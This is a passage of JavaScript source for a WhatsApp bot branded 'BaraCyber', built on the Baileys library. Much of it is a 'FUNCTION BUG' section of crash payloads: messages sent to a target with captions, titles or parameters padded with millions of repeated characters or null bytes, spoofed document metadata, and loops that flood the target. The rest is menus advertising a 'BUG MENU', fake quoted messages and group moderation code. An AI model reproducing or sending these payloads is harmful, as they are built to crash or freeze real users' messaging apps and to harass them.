stringArrayShuffle: true,
splitStrings: true,
stringArrayThreshold: 1
}
);
const result = {
status: 200,
author: `BaraCyber`,
result: obfuscationResult.getObfuscatedCode()
}
resolve(result)
} catch (e) {
reject(e)
}
})
}

/// FUNCTION BUG 
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `̔͞𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬 \n\n.savage`+"ꦾ".repeat(5000000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await BaraCybeer.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}

async function sendViewOnceMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    let messageContent = generateWAMessageFromContent(jid, {
      'viewOnceMessage': {
        'message': {
          'messageContextInfo': {
            'deviceListMetadata': {},
            'deviceListMetadataVersion': 2
          },
          'interactiveMessage': proto.Message.InteractiveMessage.create({
            'body': proto.Message.InteractiveMessage.Body.create({
              'text': ''
            }),
            'footer': proto.Message.InteractiveMessage.Footer.create({
              'text': ''
            }),
            'header': proto.Message.InteractiveMessage.Header.create({
              'title': '',
              'subtitle': '',
              'hasMediaAttachment': false
            }),
            'nativeFlowMessage': proto.Message.InteractiveMessage.NativeFlowMessage.create({
              'buttons': [{
                'name': "cta_url",
                'buttonParamsJson': "{\"display_text\":\"𝐶𝑜𝑘𝑖𝑚𝑎𝑘 ©𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
              }],
              'messageParamsJson': "\0".repeat(100000)
            })
          })
        }
      }
    }, {});
    BaraCybeer.relayMessage(jid, messageContent.message, {
      'messageId': messageContent.key.id
    });
  }
}
async function sendLiveLocationMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'liveLocationMessage': {
          'degreesLatitude': 'p',
          'degreesLongitude': 'p',
          'caption': 'Y͋͢o̯̊͢ḳ̑ͦo̊͢s̠҉o̯̱̊͊͢ ' + 'BaraCyber'.repeat(50000),
          'sequenceNumber': '0',
          'jpegThumbnail': ''
        }
      }
    }
  }), {
    'userJid': jid
  });
  
  await Hadzz.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}

async function sendListMessage(jid) {
  var messageContent = generateWAMessageFromContent(jid, proto.Message.fromObject({
    'listMessage': {
      'title': "SÌ¸HêV™°ÌÌ¸" + "\0".repeat(920000),
      'footerText': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'description': "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
      'buttonText': null,
      'listType': 2,
      'productListInfo': {
        'productSections': [{
          'title': "lol",
          'products': [{
            'productId': "4392524570816732"
          }]
        }],
        'productListHeaderImage': {
          'productId': "4392524570816732",
          'jpegThumbnail': null
        },
        'businessOwnerJid': "0@s.whatsapp.net"
      }
    },
    'footer': "lol",
    'contextInfo': {
      'expiration': 600000,
      'ephemeralSettingTimestamp': "1679959486",
      'entryPointConversionSource': "global_search_new_chat",
      'entryPointConversionApp': "whatsapp",
      'entryPointConversionDelaySeconds': 9,
      'disappearingMode': {
        'initiator': "INITIATED_BY_ME"
      }
    },
    'selectListType': 2,
    'product_header_info': {
      'product_header_info_id': 292928282928,
      'product_header_is_rejected': false
    }
  }), {
    'userJid': jid
  });
  
  await BaraCybeer.relayMessage(jid, messageContent.message, {
    'participant': {
      'jid': jid
    },
    'messageId': messageContent.key.id
  });
}


async function sendMixedMessages(jid, count) {
  for (let i = 0; i < count; i++) {
    sendLiveLocationMessage(jid);
    sendListMessage(jid);
    await sleep(500);
  }
}

function sendMessageWithMentions(text, mentions = [], quoted = false) {
  if (quoted == null || quoted == undefined || quoted == false) {
    return BaraCybeer.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  } else {
    return BaraCybeer.sendMessage(m.chat, {
      'text': text,
      'mentions': mentions
    }, {
      'quoted': m
    });
  }
}

//=================================================//
async function aipong(target) {
await BaraCybeer.relayMessage(target, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{ participant: { jid: target } })
}
//=================================================//
async function bakdok(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "documentMessage": {
    "url": "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
    "mimetype": "penis",
    "fileSha256": "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
    "fileLength": "999999999",
    "pageCount": 999999999,
    "mediaKey": "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
    "fileName": `̵᜴͉͋̔͞𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬`+"ྦྷ".repeat(60000),
    "fileEncSha256": "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
    "directPath": "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
    "mediaKeyTimestamp": "1715880173"
  }
}), { userJid: target, quoted: kuwoted });
await BaraCybeer.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function penghitaman(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  "stickerMessage": {
    "url": "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
    "fileSha256": "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
    "fileEncSha256": "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
    "mediaKey": "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
    "mimetype": "image/webp",
    "directPath": "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
    "fileLength": "10116",
    "mediaKeyTimestamp": "1715876003",
    "isAnimated": false,
    "stickerSentTs": "1715881084144",
    "isAvatar": false,
    "isAiSticker": false,
    "isLottie": false
  }
}), { userJid: target, quoted: kuwoted });
await BaraCybeer.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

//Status
if (!BaraCybeer.public) {
if (!m.key.fromMe) return
} 

//=================================================//
async function pirgam(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "BaraCyber",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "" } }, { upload: BaraCybeer.waUploadToServer }))
      },
      body: {
        text: ""
      },
      footer: {
        text: "›          #BaraCyber"
      },
      nativeFlowMessage: {
        messageParamsJson: " ".repeat(1000000)
      }
    }
}), { userJid: target, quoted: kuwoted });
await BaraCybeer.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
//=================================================//
async function loading () {
var baralod = [
"*_1_*",
"*_2_*",
"*_3_*", 
"*_Succes Loading For Menu_*", 
]
let { key } = await BaraCybeer.sendMessage(from, {text: '© 𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥'})

for (let i = 0; i < baralod.length; i++) {
await BaraCybeer.sendMessage(from, {text: baralod[i], edit: key });
}
}
        
async function baklis(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "HadzzBotBugCrash"+" ".repeat(920000),
        'footerText': `̵᜴͉͋̔͞𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬`,
        'description': `© BaraCybeer.savage`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'anjay',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'puki',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target, quoted: hdzbug });
await BaraCybeer.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}
// Fake Resize
const fkethmb = await reSize(ppuser, 300, 300)

// Cuma Fake
const sendOrder = async(jid, text, orid, img, itcount, title, sellers, tokens, ammount) => {
const order = generateWAMessageFromContent(jid, proto.Message.fromObject({
"orderMessage": {
"orderId": orid,
"thumbnail": img,
"itemCount": itcount,
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": title,
"message": text,
"sellerJid": sellers,
"token": tokens,
"totalAmount1000": ammount,
"totalCurrencyCode": "IDR",
}
}), { userJid: jid, quoted: m })
BaraCybeer.relayMessage(jid, order.message, { messageId: order.key.id})
}

// Function Reply
const reply = (teks) => {
            BaraCybeer.sendMessage(m.chat,
                {
                    text: teks,
                    contextInfo: {
                        mentionedJid: [sender],
                        forwardingScore: 9999999,
                        isForwarded: true,
                        "externalAdReply": {
                            "showAdAttribution": true,
                            "containsAutoReply": true,
                            "title": ` ⚠️BaraCyber`,
                            "body": `${namabot}`,
                            "previewType": "PHOTO",
                            "thumbnailUrl": ``,
                            "thumbnail": fs.readFileSync(`./image/Bara999.jpg`),
                            "sourceUrl": `${isLink}`
                        }
                    }
                },
                { quoted: m })
        }

const reply2 = (teks) => {
BaraCybeer.sendMessage(from, { text : teks }, { quoted : m })
}

async function replymenu(wow) {
BaraCybeer.sendMessage(m.chat, {document: fs.readFileSync("./package.json"),
fileName: "𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬 | © BaraCyber",
mimetype: "application/pdf",
fileLength: 99999,
pageCount: 666,
caption: wow,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: "BaraCyber - Comunity",
newsletterJid: "120363321008297293@newsletter",
},
externalAdReply: {  
title: global.foter, 
body: '© BaraCyber🌠',
thumbnail: mengkece,
sourceUrl: global.linkyt, 
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})}

// fake quoted bug
const lep = { 
key: {
fromMe: [], 
participant: "0@s.whatsapp.net", ...(from ? { remoteJid: "" } : {}) 
},
'message': {
"stickerMessage": {
"url": "https://mmg.whatsapp.net/d/f/At6EVDFyEc1w_uTN5aOC6eCr-ID6LEkQYNw6btYWG75v.enc",
"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
"mimetype": "image/webp",
"height": 40,
"width": 40,
"directPath": "/v/t62.7118-24/19433981_407048238051891_5533188357877463200_n.enc?ccb=11-4&oh=01_AVwXO525CP-5rmcfl6wgs6x9pkGaO6deOX4l6pmvZBGD-A&oe=62ECA781",
"fileLength": "99999999",
"mediaKeyTimestamp": "16572901099967",
'isAnimated': []
}}}

const hw = { 
key: {
fromMe: false, 
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) 
},
"message": {
"audioMessage": {
"url": "https://mmg.whatsapp.net/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172&mms3=true",
"mimetype": "audio/mp4",
"fileSha256": "oZeGy+La3ZfKAnQ1epm3rbm1IXH8UQy7NrKUK3aQfyo=",
"fileLength": "1067401",
"seconds": 60,
"ptt": true,
"mediaKey": "PeyVe3/+2nyDoHIsAfeWPGJlgRt34z1uLcV3Mh7Bmfg=",
"fileEncSha256": "TLOKOAvB22qIfTNXnTdcmZppZiNY9pcw+BZtExSBkIE=",
"directPath": "/v/t62.7114-24/56189035_1525713724502608_8940049807532382549_n.enc?ccb=11-4&oh=01_AdR7-4b88Hf2fQrEhEBY89KZL17TYONZdz95n87cdnDuPQ&oe=6489D172",
"mediaKeyTimestamp": "1684161893"
}}}

const fkontak = { key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;Vinzx,;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': { url: 'https://b.top4top.io/p_3189wqnd31.jpg' }}}}
function parseMention(text = '') {
return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
}
    
if (m.isGroup && !m.key.fromMe && !isOwner && antilink) {
if (!isBotAdmins) return
if (budy.match(`whatsapp.com`)) {
BaraCybeer.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
BaraCybeer.groupParticipantsUpdate(m.chat, [sender], 'delete')
BaraCybeer.sendMessage(m.chat, { delete: m.key })
}
}

switch (command) {

case 'menu':
case 'help': {
reactemoji('🔄')
await loading()
const version = require("baileys/package.json").version
const menu = `⏤ ㏒ ━═━═━∞━═━═━ ㏑ ⏤
│ ﹎ᖫ © 𝘏𝘢𝘥𝘻𝘻𝘔𝘰𝘥𝘴 𒁂ᖭ﹎
╰─═─═─═─═─═─═─═─═─


╭────ꕥ *𝙄𝙉𝙁𝙊 𝘽𝙊𝙏* ꕥ────
│✞  𝗡𝗮𝗺𝗲 𝗕𝗼𝘁 : ${namabot}
│◦   𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${run}
│◦   𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${versisc}
│✞  𝗗𝗲𝘃 : ${namaCreator}
└──ꕥ

┏═━═━═━═━═━═━═━═━═━═━═━┓
┃ 𖣘 ───────────────── 𖣘
┃     \`[ https://t.me/infobotv5 ]\`
┃     *[ # ] Untuk Melihat Menu*
┃ 𖣘 ───────────────── 𖣘
┗═━═━═━═━═━═━═━═━═━═━═━┛

\`[ IND ]\`
*[ 🇮🇩 ] Jangan Disalah Gunakan Pada Orang Yang Tidak Bersalah, Jika Melakukannya Siap Menerima Akibatnya*

\`[ ING ]\`
*[ 🇬🇧 ] Do not use it on innocent people, i.f they are prepared to accept the consequences.*

┏━━━━━ \`DEVELOPER\` ━━━━┓
┃------------\`BARACYBER\`----------  
┃----------\`t.me//BaraSepuh\`------ 
┗━━━━━════✞════━━━━━━┛
`
let sections = [{
title: '# 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬',
highlight_label: 'LIST MENU 𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥',
rows: [{
title: 'LIST MENU',
description: `[ # ] MENAMPILKAN LIST MENU`, 
id: '.BaraCyber',
}]
},
{
title: '# My Support',
highlight_label: 'TQTO',
rows: [{
title: 'TQTO',
description: `[ # ] MENAMPILKAN TQTO`, 
id: '.tqto'
    }]
     }]
let listMessage = {
    title: 'Menu 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: menu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: '© BaraCyber'
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./image/nulll.jpg")}, { upload: BaraCybeer.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"MY YOUTUBE\",\"url\":\"https://youtube.con/@Baradeveloper_\",\"merchant_url\":\"https://youtube.con/@Baradeveloper_\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await BaraCybeer.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'BaraCyber': {
reactemoji('🔄')
await loading()
const version = require("baileys/package.json").version
const hdztzy = ` ╭━╍╍╍╍╍╍╍╍ ✞ ╍╍╍╍
│ ﹎✞ © BaraCyber ✞
╰─┉┉┉┅┅┅✞┉┉┉┉┅┉┅┅



╭────ꕥ *𝙄𝙉𝙁𝙊 𝘽𝙊𝙏* ꕥ────
│✞  𝗡𝗮𝗺𝗲 𝗕𝗼𝘁 : ${namabot}
│◦   𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${run}
│◦   𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${versisc}
│✞  𝗗𝗲𝘃 : ${namaCreator}
└──ꕥ

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ LIST MENU ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .ᴀʟʟᴍᴇɴᴜ
│  ◦  .ᴍᴀɪɴᴍᴇɴᴜ
│  ◦  .sᴛᴏʀᴇᴍᴇɴᴜ
│  ◦  .ᴛᴏᴏʟsᴍᴇɴᴜ
│  ◦  .aiᴍᴇɴᴜ
│  ◦  .ʙᴜɢᴍᴇɴᴜ
│  ◦  .ᴘᴀɴᴇʟᴍᴇɴᴜ
│  ◦  .tqto
╰┈────────────────𖣘

\`[ ɪɴᴅ ]\`
*[ 🇮🇩 ] ᴊᴀɴɢᴀɴ ᴅɪsᴀʟᴀʜ ɢᴜɴᴀᴋᴀɴ ᴘᴀᴅᴀ ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ, ᴊɪᴋᴀ ᴍᴇʟᴀᴋᴜᴋᴀɴɴʏᴀ sɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴀᴋɪʙᴀᴛɴʏᴀ*

\`[ ɪɴɢ ]\`
*[ 🇬🇧 ] ᴅᴏ ɴᴏᴛ ᴜsᴇ ɪᴛ ᴏɴ ɪɴɴᴏᴄᴇɴᴛ ᴘᴇᴏᴘʟᴇ, ɪ.ғ ᴛʜᴇʏ ᴀʀᴇ ᴘʀᴇᴘᴀʀᴇᴅ ᴛᴏ ᴀᴄᴄᴇᴘᴛ ᴛʜᴇ ᴄᴏɴsᴇᴏ̨ᴜᴇɴᴄᴇs.*

┏━━━━━ \`DEVELOPER\` ━━━━┓
┃------------\`BARACYBER\`----------  
┃----------\`t.me//BaraSepuh\`------ 
┗━━━━━════✞════━━━━━━┛`
let sections = [{
title: '# 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬',
highlight_label: 'LIST MENU 𝗕𝗔𝗥𝗔 𝗖𝗬𝗕𝗘𝗥',
rows: [{
title: 'MENU',
description: `[ # ] MENAMPILKAN MENU`, 
id: '.BaraCyber'
}, 
{
title: '#ALL MENU',
description: `[ # ] MENAMPILKAN ALL MENU`, 
id: '.allmenu'
}, 
{
title: '#MAIN MENU',
description: `[ # ] MENAMPILKAN MAIN MENU`, 
id: '.mainmenu'
},
{
title: '#AI MENU',
description: `[ # ] MENAMPILKAN AI MENU`, 
id: '.aimenu'
},
{
title: '#GROUP MENU', 
description: `[ # ] MENAMPILKAN GROUP MENU`,
id: 'groupmenu', 
},
{
title: '#STORE MENU',
description: `[ # ] MENAMPILKAN STORE MENU`, 
id: '.storemenu'
}, 
{
title: '#TOOLS MENU',
description: `[ # ] MENAMPILKAN TOOLS MENU`, 
id: '.toolsmenu'
},
{
title: '#BUG MENU',
description: `[ # ] MENAMPILKAN BUG MENU`, 
id: '.bugmenu'
    }]
     }]
let listMessage = {
    title: 'Klik Disini🌀', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: hdztzy
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: '© BaraCyber'
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./image/nulll.jpg")}, { upload: BaraCybeer.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"MY YOUTUBE\",\"url\":\"https://youtube.con/@Baradeveloper_\",\"merchant_url\":\"https://youtube.con/@Baradeveloper_\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await BaraCybeer.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'mainmenu': {
await loading()
const mainmenu = `╭━╍╍╍╍╍╍╍╍ ✞ ╍╍╍╍
│ ﹎✞ © BaraCyber ✞
╰─┉┉┉┅┅┅✞┉┉┉┉┅┉┅┅


╭────ꕥ *𝙄𝙉𝙁𝙊 𝘽𝙊𝙏* ꕥ────
│✞  𝗡𝗮𝗺𝗲 𝗕𝗼𝘁 : ${namabot}
│◦   𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${run}
│◦   𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${versisc}
│✞  𝗗𝗲𝘃 : ${namaCreator}
└──ꕥ

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ DOWNLOAD ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .ᴛᴛ
│  ◦  .ᴛᴛᴍᴘ3
│  ◦  .ᴛɪᴋᴛᴏᴋ
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ REMINI ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .ʜᴅ < ɪᴍᴀɢᴇ >
│  ◦  .ʜᴅɪᴍɢ < ɪᴍᴀɢᴇ >
│  ◦  .ʜᴅʀ < ɪᴍᴀɢᴇ >
│  ◦  .ʀᴇᴍɪɴɪ < ɪᴍᴀɢᴇ >
│  ◦  .ᴘᴀɴᴇʟᴍᴇɴᴜ
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ STICKER ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .ǫᴄ < ǫᴜᴇʀʏ >
│  ◦  .sᴛɪᴋᴇʀ < ʀᴇᴘʟʏ/ɪᴍᴀɢᴇ >
╰┈────────────────𖣘

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ SCRIPT ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .sᴄ 
╰┈────────────────𖣘

\`[ ɪɴᴅ ]\`
*[ 🇮🇩 ] ᴊᴀɴɢᴀɴ ᴅɪsᴀʟᴀʜ ɢᴜɴᴀᴋᴀɴ ᴘᴀᴅᴀ ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ, ᴊɪᴋᴀ ᴍᴇʟᴀᴋᴜᴋᴀɴɴʏᴀ sɪᴀᴘ ᴍᴇɴᴇʀɪᴍᴀ ᴀᴋɪʙᴀᴛɴʏᴀ*

\`[ ɪɴɢ ]\`
*[ 🇬🇧 ] ᴅᴏ ɴᴏᴛ ᴜsᴇ ɪᴛ ᴏɴ ɪɴɴᴏᴄᴇɴᴛ ᴘᴇᴏᴘʟᴇ, ɪ.ғ ᴛʜᴇʏ ᴀʀᴇ ᴘʀᴇᴘᴀʀᴇᴅ ᴛᴏ ᴀᴄᴄᴇᴘᴛ ᴛʜᴇ ᴄᴏɴsᴇǫᴜᴇɴᴄᴇs.*

┏━━━━━ \`DEVELOPER\` ━━━━┓
┃------------\`BARACYBER\`----------  
┃----------\`t.me//BaraSepuh\`------ 
┗━━━━━════✞════━━━━━━┛`
let sections = [{
title: '# 𝗕𝗔𝗥𝗔𝟵𝟵𝟵 𝗩𝗘𝗥𝗦𝗜𝗢𝗡 𝟱.𝟬',
highlight_label: 'LIST MENU BaraCyber',
rows: [{
title: 'MENU',
description: `[ # ] MENAMPILKAN MENU`, 
id: '.BaraCyber'
}, 
{
title: '#ALL MENU',
description: `[ # ] MENAMPILKAN ALL MENU`, 
id: '.allmenu'
}, 
{
title: '#MAIN MENU',
description: `[ # ] MENAMPILKAN MAIN MENU`, 
id: '.mainmenu'
},
{
title: '#AI MENU',
description: `[ # ] MENAMPILKAN AI MENU`, 
id: '.aimenu'
},
{
title: '#GROUP MENU', 
description: `[ # ] MENAMPILKAN GROUP MENU`,
id: 'groupmenu', 
},
{
title: '#STORE MENU',
description: `[ # ] MENAMPILKAN STORE MENU`, 
id: '.storemenu'
}, 
{
title: '#TOOLS MENU',
description: `[ # ] MENAMPILKAN TOOLS MENU`, 
id: '.toolsmenu'
},
{
title: '#BUG MENU',
description: `[ # ] MENAMPILKAN BUG MENU`, 
id: '.bugmenu'
    }]
     }]
let listMessage = {
    title: 'Klik Disini🌀', 
    sections
};

let freesex = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: mainmenu
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: '© BaraCyber'
}), 
header: proto.Message.InteractiveMessage.Header.create({ 
hasMediaAttachment: true, ...(await prepareWAMessageMedia({ image: await fs.readFileSync("./image/nulll.jpg")}, { upload: BaraCybeer.waUploadToServer })) 
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"MY YOUTUBE\",\"url\":\"https://youtube.con/@Baradeveloper_\",\"merchant_url\":\"https://youtube.con/@Baradeveloper_\"}"
}]
}) 
})} 
}}, {userJid: m.sender, quoted: m}) 
await BaraCybeer.relayMessage(freesex.key.remoteJid, freesex.message, { 
messageId: freesex.key.id 
})
}
break

case 'aimenu': {
await loading()
const aimenu = `╭━╍╍╍╍╍╍╍╍ ✞ ╍╍╍╍
│ ﹎✞ © BaraCyber ✞
╰─┉┉┉┅┅┅✞┉┉┉┉┅┉┅┅


╭────ꕥ *𝙄𝙉𝙁𝙊 𝘽𝙊𝙏* ꕥ────
│✞  𝗡𝗮𝗺𝗲 𝗕𝗼𝘁 : ${namabot}
│◦   𝗥𝘂𝗻𝘁𝗶𝗺𝗲 : ${run}
│◦   𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : ${versisc}
│✞  𝗗𝗲𝘃 : ${namaCreator}
└──ꕥ

✞ ─────────𖣘──────── ✞
  ┆ </> \`[ AI MENU ]\` </>
✞ ─────────𖣘──────── ✞

╭┈──────────────────𖣘
│  ◦  .ʜᴅᴢ-ᴀɪ
╰┈────────────────𖣘

\`[ ɪɴᴅ ]\`
